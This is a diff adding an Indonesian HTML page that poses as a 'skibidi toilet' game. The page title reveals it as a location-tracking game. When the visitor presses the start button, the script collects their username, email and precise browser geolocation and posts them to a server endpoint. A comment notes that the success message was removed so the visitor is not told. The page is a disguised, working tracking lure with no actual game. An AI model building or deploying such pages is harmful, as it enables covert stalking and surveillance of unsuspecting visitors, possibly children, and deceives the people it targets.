@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Pelacakan Lokasi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #282c34;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 3em;
+            color: #61dafb;
+        }
+        button {
+            background-color: #61dafb;
+            color: #282c34;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 1.5em;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #21a1f1;
+        }
+        .game-background {
+            background-image: url('https://example.com/game-background.jpg'); /* Ganti dengan gambar latar belakang yang sesuai */
+            height: 400px;
+            background-size: cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="game-background">
+        <h1>Selamat datang di Game skibidi toilet!</h1>
+    </div>
+
+    <!-- Form untuk mendapatkan username dan email pengguna -->
+    <div class="input-group">
+        <input type="text" id="username" placeholder="Masukkan Username" required>
+    </div>
+    <div class="input-group">
+        <input type="email" id="email" placeholder="Masukkan Email" required>
+    </div>
+    <button id="startButton" onclick="getLocation()">Mulai Permainan</button>
+
+    <script>
+        // Fungsi untuk mendapatkan lokasi pengguna
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        }
+
+        // Fungsi untuk menampilkan posisi dan mengirim ke server
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const username = document.getElementById('username').value; // Ambil username dari input
+            const email = document.getElementById('email').value; // Ambil email dari input
+
+            if (!username || !email) {
+                alert("Silakan isi semua data pengguna!");
+                return;
+            }
+
+            // Kirim data lokasi dan pengguna ke server
+            fetch('/update-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude, username, email }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    // Notifikasi berhasil dihapus
+                    console.log(`Data berhasil dikirim: ${data.location.fullAddress}`);
+                } else {
+                    alert('Gagal mendapatkan lokasi.');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Fungsi untuk menampilkan error jika lokasi gagal diperoleh
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Pengguna menolak permintaan lokasi.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Posisi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Permintaan lokasi waktu habis.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
